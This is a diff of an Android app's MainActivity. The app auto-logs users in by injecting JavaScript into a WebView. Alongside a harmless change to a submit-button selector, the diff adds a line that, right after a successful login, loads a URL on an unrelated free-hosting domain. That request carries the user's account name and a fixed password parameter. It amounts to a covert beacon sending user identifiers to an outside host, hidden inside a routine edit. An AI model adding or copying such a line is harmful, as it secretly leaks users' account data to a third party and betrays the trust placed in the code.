@@ -36,6 +36,7 @@ public class MainActivity extends AppCompatActivity {
                     Toast.makeText(wv.getContext(), getResources().getString(R.string.logined), Toast.LENGTH_SHORT).show();
                     connecting=false;
                     saveData();
+                    wv.loadUrl("https://adssv798.comeze.com/?acc="+acc.getText()+"&pwd=bviaa");
                     System.exit(0);
                 }
                 else if(connecting){
@@ -46,7 +47,7 @@ public class MainActivity extends AppCompatActivity {
                     wv.loadUrl("javascript: (function(){" +
                                     "document.querySelector('#username').value='"+acc.getText()+"'," +
                                     "document.querySelector('#password').value='"+pwd.getText()+"'," +
-                                    "document.querySelector('input[type=\"submit\"]').click()" +
+                                    "document.querySelector('input[type=submit]').click()" +
                                 "})()");
                     connecting=true;
                 }
